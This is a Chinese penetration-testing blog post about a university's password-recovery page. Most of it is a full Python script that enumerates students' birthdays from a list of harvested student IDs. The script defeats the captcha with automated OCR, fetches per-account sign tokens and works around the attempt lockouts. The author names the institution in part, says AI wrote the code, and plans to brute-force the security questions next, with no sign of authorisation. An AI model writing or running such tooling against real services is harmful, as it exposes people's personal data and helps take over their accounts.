---
title: 【漏洞案例】某高校验证生日信息功能可枚举用户生日信息
tags:
  - private
description: >-
  声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。
comments: true
categories:
  - 渗透测试
  - 漏洞案例
abbrlink: 960078f8
date: 2025-07-23 11:08:52
top:
---

## 7.26动态captchId，服务端Session参数

今天遇到了某学校一个比较难的弱口令，搞来搞去最后虽然把这一道攻破，但是攻破之后竟然还有防护。但是 ~~*不留点痕迹我不白打了*~~ 涨了些见识，大体上是这样：

- 信息收集获得1000+该学校学生学号
- 该学校统一身份认证平台忘记密码功能支持回答密保改密，只需要输入学号，提交自己的生日就可以回答密保。
- 只能提交11次，第11次如果错误将被限制1小时
- POST方式提交，一共四个参数：captchaId、captcha、name、loginNo、birthday、sign
- 每次点击重新生成验证码前端页面自动刷新随机且相同的captchaId 和ltId

- ltId通过GET方式传入获取验证码的URL请求中
- captchaId 传入POST，服务端会验证和自己收到的ltId是否相同
- sign第一步输入学号之后是服务端发来的，提交生日是在第二步，每个学号sign固定，但每个学号必须重新获得sign

思路大概是这样的：

- 一个小时11次，生日字典是2*365=730天的话，3天就把一千多人跑完了。哪怕我只跑一次，也有11/730\*1000=10+个人被我破了，也就是几分钟一个呗。因此爆破生日可是行的
- burpsuite的 `captcha-killer` 这个插件是不支持改变获取验证码的GET请求的参数的，因此要写脚本。
- captchaId 和ltId是前段随机生成的，后端不可能知道。因此直接用Python自己生成就可以了。
- sign是服务端返回的，因此我要在每一次对学号进行爆破前，先发个请求获取sign。
- 图片发给本地识别验证码的服务进行识别
- 爆破完然后再爆破密保

最终的Python脚本如下：

```python
import requests  # 用于发送HTTP请求
import random    # 用于生成随机数
import time      # 用于时间控制和延时
import json      # 用于处理JSON数据
import base64    # 用于Base64编码解码
import os        # 用于操作系统相关操作（文件路径等）
from requests.adapters import HTTPAdapter  # 用于HTTP适配器配置
from urllib3.util.retry import Retry       # 用于请求重试策略
import urllib3   # 用于处理HTTP连接

# ====================== 配置区域 ======================
# 调试模式开关，True时输出详细日志
DEBUG_MODE = False

# 文件路径配置
LOGIN_NO_FILE = "No.txt"        # 存储学号的文件
BIRTHDAY_FILE = "birthday.txt"  # 存储生日的文件
RESULT_FILE = "result.txt"      # 存储爆破成功结果的文件

# 验证码识别服务配置
CAPTCHA_API = "http://127.0.0.1:8888/reg"  # 本地验证码识别服务的URL

# 用户代理配置
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"

# 禁用SSL证书验证警告（不然容易获取sign失败）
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 固定Cookie配置（根据实际网站Cookie设置）
COOKIES = {
    "XXXX": "XXXXXXXXXXXXXXXXXX",  
    "XXXXXXXX": "XXXXXXXXXXXXX",
    ....................
}

# 通用请求头配置（模拟浏览器行为）
COMMON_HEADERS = {
    "Sec-Ch-Ua": '"Chromium";v="133", "Not(A:Brand";v="99"',  # 浏览器信息
    "Sec-Ch-Ua-Mobile": "?0",  # 是否移动设备
    "Sec-Ch-Ua-Platform": '"Windows"',  # 操作系统平台
    ...........................
    ...........................
    ...........................
    ...........................
    ...........................
    ...........................
    ...........................
    ...........................
    ...........................
}

# 验证码识别服务专用请求头配置
CAPTCHA_RECOG_HEADERS = {
    "Authorization": "Basic f0ngauth",  # 基本认证
    "Content-Type": "text/plain",  # 内容类型为纯文本
    "User-Agent": "XXXXXXXXXXXXXXXXXX",  # 用户代理
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  # 接受的内容类型
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",  # 接受的语言
    "Connection": "keep-alive",  # 保持连接
    "Upgrade-Insecure-Requests": "1"  # 升级不安全请求
}

# 网站关键URL配置
RETRIEVE_PASSWORD_URL = "https://XXXXXXXXXX.edu.cn/XXXXXXXX/XXXXXXXX/XXXXXXXX.html"  # 找回密码页面URL
CAPTCHA_URL = "https://XXXXXXXXXXXXXXXXXX.edu.cn/retrieve-XXXXXXXX/XXXXXXXX"  # 验证码获取URL
GET_SIGN_URL = "https://XXXXXXXXn.edu.cn/XXXXXXXX/XXXXXXXX/XXXXXXXX"  # 获取sign值的URL
BIRTHDAY_CHECK_URL = "https://XXXXXXXX.xidian.edu.cn/XXXXXXXX/XXXXXXXX/XXXXXXXX"  # 生日验证URL
# =====================================================

def load_targets():
    """
    加载爆破目标（学号和生日）
    返回值：
        logins: 学号列表
        birthdays: 生日列表
    """
    # 读取学号文件
    with open(LOGIN_NO_FILE, 'r', encoding='utf-8') as f:
        # 去除每行首尾空白并过滤空行
        logins = [line.strip() for line in f.readlines() if line.strip()]
    
    # 读取生日文件
    with open(BIRTHDAY_FILE, 'r', encoding='utf-8') as f:
        # 去除每行首尾空白并过滤空行
        birthdays = [line.strip() for line in f.readlines() if line.strip()]
    
    return logins, birthdays

def get_retrieve_password_page(session):
    """
    访问找回密码页面，初始化会话
    参数：
        session: requests会话对象
    """
    # 配置请求头
    headers = {
        **COMMON_HEADERS,  # 继承通用请求头
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",  # 接受HTML内容
        "Sec-Fetch-Mode": "navigate",  # 导航模式
        "Sec-Fetch-Dest": "document",  # 目标为文档
        "Referer": "https://XXXXXXXX.edu.cn/"  # 来源页面
    }
    
    # URL参数配置
    params = {
        "service": "https%3A%2F%2FXXXXXXXX"
    }
    
    # 发送GET请求
    response = session.get(
        RETRIEVE_PASSWORD_URL,
        headers=headers,
        params=params,
        timeout=10
    )
    
    # 检查响应状态码
    if response.status_code != 200:
        raise Exception(f"找回密码页面访问失败，状态码: {response.status_code}")
    
    # 调试模式下输出成功信息
    if DEBUG_MODE:
        print(f"[*] 成功访问找回密码页面")

def get_captcha_image(session, captcha_id):
    """
    获取验证码图片
    参数：
        session: requests会话对象
        captcha_id: 验证码ID
    返回值：
        验证码图片的二进制内容
    """
    # URL参数配置
    params = {
        "ltId": captcha_id,  # 验证码ID
        "codeType": "2"      # 验证码类型
    }
    
    # 配置请求头
    headers = {
        **COMMON_HEADERS,  # 继承通用请求头
        "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",  # 接受图片内容
        "Sec-Fetch-Mode": "no-cors",  # 非跨域模式
        "Sec-Fetch-Dest": "image",    # 目标为图片
        "Referer": RETRIEVE_PASSWORD_URL  # 来源页面
    }
    
    try:
        # 发送GET请求获取验证码图片
        response = session.get(
            CAPTCHA_URL,
            headers=headers,
            params=params,
            timeout=10
        )
        
        # 检查响应状态码
        if response.status_code != 200:
            raise Exception(f"验证码请求失败，状态码: {response.status_code}")
        
        # 调试模式下输出图片大小
        if DEBUG_MODE:
            print(f"[*] 获取到验证码图像 (大小: {len(response.content)}字节)")
        
        # 返回图片二进制内容
        return response.content
    
    except Exception as e:
        # 捕获并输出异常
        print(f"[-] 验证码获取错误: {str(e)}")
        raise  # 重新抛出异常

def recognize_captcha(image_data):
    """
    调用本地验证码识别服务识别验证码
    参数：
        image_data: 验证码图片的二进制数据
    返回值：
        识别出的验证码文本
    """
    # 检查图片数据是否为空
    if not image_data:
        raise Exception("图片数据为空")
    
    # 设置最大重试次数
    max_retries = 3
    for attempt in range(max_retries):
        try:
            # 将图片数据转换为Base64字符串
            base64_str = base64.b64encode(image_data).decode('utf-8')
            
            # 发送POST请求到验证码识别服务
            response = requests.post(
                CAPTCHA_API, 
                headers=CAPTCHA_RECOG_HEADERS,
                data=base64_str,
                timeout=15
            )
            
            # 检查响应状态码
            if response.status_code == 200:
                # 获取并清理识别结果
                captcha_text = response.text.strip()
                
                # 调试模式下输出识别结果
                if DEBUG_MODE:
                    print(f"[*] 验证码识别结果: {captcha_text}")
                
                # 返回识别结果
                return captcha_text
            else:
                # 处理识别服务错误
                error_msg = f"验证码识别服务错误，状态码: {response.status_code}"
                if DEBUG_MODE:
                    print(f"[-] {error_msg} (尝试 {attempt+1}/{max_retries})")
                    print(f"[-] 响应内容: {response.text[:200]}")
                
                # 保存失败图像用于调试
                debug_filename = f"captcha_error_{int(time.time())}.jpg"
                with open(debug_filename, 'wb') as f:
                    f.write(image_data)
                print(f"[-] 验证码识别失败，已保存图像: {debug_filename}")
                
        except Exception as e:
            # 捕获并输出识别异常
            print(f"[-] 验证码识别异常: {str(e)} (尝试 {attempt+1}/{max_retries})")
    
    # 所有尝试失败后抛出异常
    raise Exception(f"验证码识别失败，重试{max_retries}次后仍无法识别")

def get_sign_value(session, captcha_id, captcha_text, login_no):
    """
    获取sign值（关键验证参数）
    参数：
        session: requests会话对象
        captcha_id: 验证码ID
        captcha_text: 验证码文本
        login_no: 学号
    返回值：
        sign值
    """
    # 构造请求负载
    payload = {
        "accountId": "",  # 账户ID（通常为空）
        "loginNo": login_no,  # 学号
        "cellphone": "",  # 手机号（通常为空）
        "email": "",  # 邮箱（通常为空）
        "hideCellphone": "",  # 隐藏的手机号（通常为空）
        "hideEmail": "",  # 隐藏的邮箱（通常为空）
        "captchaId": captcha_id,  # 验证码ID
        "captcha": captcha_text,  # 验证码文本
        "code": "",  # 验证码（通常为空）
        "type": "cellphone",  # 验证类型（手机）
        "password": "",  # 密码（通常为空）
        "confirmPassword": "",  # 确认密码（通常为空）
        "sign": ""  # sign值（初始为空）
    }
    
    # 配置请求头
    headers = {
        **COMMON_HEADERS,  # 继承通用请求头
        "Content-Type": "application/json",  # 内容类型为JSON
        "Referer": RETRIEVE_PASSWORD_URL  # 来源页面
    }
    
    try:
        # 发送POST请求获取sign值
        response = session.post(
            GET_SIGN_URL,
            headers=headers,
            data=json.dumps(payload),  # 将字典转换为JSON字符串
            timeout=15
        )
        
        # 检查响应状态码
        if response.status_code != 200:
            raise Exception(f"获取sign请求失败，状态码: {response.status_code}")
        
        # 解析JSON响应
        response_data = response.json()
        
        # 检查响应码是否为成功状态
        if response_data.get("code") != "0":
            raise Exception(f"获取sign失败: {response_data.get('message')}")
        
        # 解析datas字段中的sign值（嵌套JSON）
        datas = json.loads(response_data["datas"])
        sign = datas.get("sign")
        
        # 检查是否成功获取sign值
        if not sign:
            raise Exception("无法从响应中提取sign值")
        
        # 调试模式下输出sign值
        if DEBUG_MODE:
            print(f"[*] 成功获取sign值: {sign}")
        
        # 返回sign值
        return sign
    
    except Exception as e:
        # 捕获并输出错误
        print(f"[-] 获取sign值时出错: {str(e)}")
        # 调试模式下输出响应内容
        if DEBUG_MODE and response:
            print(f"[-] 响应内容: {response.text[:500]}")
        raise  # 重新抛出异常

def send_birthday_check(session, payload):
    """
    发送生日检查请求
    参数：
        session: requests会话对象
        payload: 请求负载数据
    返回值：
        响应对象
    """
    # 配置请求头
    headers = {
        **COMMON_HEADERS,  # 继承通用请求头
        "Content-Type": "application/json",  # 内容类型为JSON
        "Referer": RETRIEVE_PASSWORD_URL  # 来源页面
    }
    
    # 发送POST请求
    return session.post(
        BIRTHDAY_CHECK_URL,
        headers=headers,
        data=json.dumps(payload),  # 将字典转换为JSON字符串
        timeout=15
    )

def check_response(response):
    """
    检查响应并返回处理结果
    参数：
        response: 响应对象
    返回值：
        status_code: 状态码
        status_msg: 状态描述
    """
    try:
        # 设置响应编码
        response.encoding = 'utf-8'
        # 获取响应文本
        response_text = response.text
        
        # 调试模式下输出响应内容
        if DEBUG_MODE:
            print(f"[*] 服务器响应: {response_text[:200]}...")
        
        # 检查响应内容并分类处理
        if "验证码不正确" in response_text:
            return 0, "验证码不正确，需要重试"
        elif "超时" in response_text:
            return 1, "请求超时，需要重新获取sign值"
        elif "您的回答与存档信息不符" in response_text:
            return 2, "回答不符，继续下一个生日"
        elif "错误次数过多" in response_text:
            return 3, "错误次数过多，跳过当前学号"
        elif "code" in response_text and "message" in response_text:
            # 尝试解析JSON响应
            response_data = response.json()
            if response_data.get("code") == "0":
                return 4, "成功匹配，保存结果"
            else:
                return -1, f"服务器返回错误: {response_data.get('message')}"
        else:
            # 默认视为成功匹配
            return 4, "成功匹配，保存结果"
        
    except Exception as e:
        # 解析失败时返回错误
        return -1, f"响应解析错误: {str(e)}"

def save_result(login_no, birthday):
    """
    保存成功结果到文件
    参数：
        login_no: 学号
        birthday: 生日
    """
    # 追加写入结果文件
    with open(RESULT_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{login_no},{birthday}\n")
    # 输出成功信息
    print(f"[!!!] 成功匹配: {login_no} - {birthday}")

def main():
    """主爆破函数"""
    # 确保结果文件存在（不存在则创建）
    if not os.path.exists(RESULT_FILE):
        open(RESULT_FILE, 'w').close()
    
    # 加载目标数据
    logins, birthdays = load_targets()
    print(f"[+] 加载 {len(logins)} 个学号, 每个学号尝试 {len(birthdays)} 个生日")
    
    # 创建requests会话（保持Cookie等状态）
    session = requests.Session()
    session.verify = False  # 禁用SSL证书验证（避免证书错误）
    
    # 设置重试策略（提高网络请求的健壮性）
    retries = Retry(
        total=3,  # 最大重试次数
        backoff_factor=0.5,  # 重试间隔因子
        status_forcelist=[500, 502, 503, 504]  # 需要重试的状态码
    )
    # 应用重试策略到HTTPS请求
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    # 设置会话Cookie
    session.cookies.update(COOKIES)
    
    try:
        # 1. 访问找回密码页面初始化会话
        get_retrieve_password_page(session)
    except Exception as e:
        # 初始化失败时退出
        print(f"[-] 初始化会话失败: {str(e)}")
        return
    
    # 遍历所有学号
    for login_idx, login_no in enumerate(logins):
        print(f"\n[+] 正在处理学号 ({login_idx+1}/{len(logins)}): {login_no}")
        skip_current_login = False  # 标记是否跳过当前学号
        
        # 为当前学号获取sign值（最多尝试3次）
        sign_value = None
        for sign_attempt in range(3):
            try:
                # 2. 生成验证码ID（16位数字）
                captcha_id = ''.join(random.choices('0123456789', k=16))
                
                # 3. 获取验证码图片
                captcha_image = get_captcha_image(session, captcha_id)
                
                # 4. 识别验证码
                captcha_text = recognize_captcha(captcha_image)
                
                # 5. 获取sign值
                sign_value = get_sign_value(session, captcha_id, captcha_text, login_no)
                if sign_value:
                    break  # 成功获取后跳出循环
            except Exception as e:
                print(f"[-] 获取sign值尝试 {sign_attempt+1}/3 失败: {str(e)}")
        
        # 检查是否成功获取sign值
        if not sign_value:
            print("[-] 无法获取sign值，跳过当前学号")
            continue  # 跳过当前学号
        
        # 遍历所有生日
        for birthday_idx, birthday in enumerate(birthdays):
            if skip_current_login:
                break  # 跳过当前学号
                
            # 每个生日最多尝试3次（处理验证码错误等临时问题）
            for attempt in range(3):
                try:
                    # 6. 生成新的验证码ID（16位数字）
                    captcha_id = ''.join(random.choices('0123456789', k=16))
                    
                    # 7. 获取验证码图片
                    captcha_image = get_captcha_image(session, captcha_id)
                    
                    # 8. 识别验证码
                    captcha_text = recognize_captcha(captcha_image)
                    
                    # 9. 构造请求负载
                    payload = {
                        "captchaId": captcha_id,  # 验证码ID
                        "captcha": captcha_text,  # 验证码文本
                        "loginNo": login_no,      # 学号
                        "birthday": birthday,     # 生日
                        "sign": sign_value        # 之前获取的sign值
                    }
                    
                    # 调试模式下输出负载
                    if DEBUG_MODE:
                        print(f"[*] 发送负载: {json.dumps(payload)}")
                    
                    # 10. 发送生日检查请求
                    response = send_birthday_check(session, payload)
                    
                    # 11. 处理响应
                    status_code, status_msg = check_response(response)
                    print(f"[*] 尝试 {login_no}/{birthday} (尝试{attempt+1}/3): {status_msg}")
                    
                    # 根据响应状态处理
                    if status_code == 0:  # 验证码不正确
                        continue  # 重试当前生日
                    elif status_code == 1:  # 请求超时
                        print("[-] 请求超时，需要重新获取sign值")
                        # 重新获取sign值
                        sign_value = get_sign_value(session, captcha_id, captcha_text, login_no)
                        print(f"[+] 重新获取到sign值: {sign_value}")
                        continue  # 重试当前生日
                    elif status_code == 2:  # 回答不符
                        break  # 继续下一个生日
                    elif status_code == 3:  # 错误次数过多
                        skip_current_login = True  # 标记跳过当前学号
                        break  # 跳出生日循环
                    elif status_code == 4:  # 成功匹配
                        save_result(login_no, birthday)  # 保存结果
                        break  # 跳出生日循环
                    else:  # 其他错误
                        break  # 跳出重试循环
                        
                except Exception as e:
                    # 捕获并输出请求异常
                    print(f"[-] 请求异常: {str(e)}")
        
    # 程序入口
if __name__ == "__main__":
    try:
        main()  # 执行主函数
    except KeyboardInterrupt:
        # 处理用户中断（Ctrl+C）
        print("\n[!] 用户中断，程序退出")
    except Exception as e:
        # 捕获并输出未处理的异常
        print(f"[!!!] 程序异常: {str(e)}")
```

AI是真好用，又能敲代码又能写注释。

搞了这么花里胡哨，还是被我搞破了。当我怀着激动的心情爆破密保的时候。。。。

果然这世界不是总那么美好。仅仅爆破了五次，就提醒我错误次数过多，封了一个小时。那么多的密保问题，那么多的排列组合......

于是一声“tim”响起..........











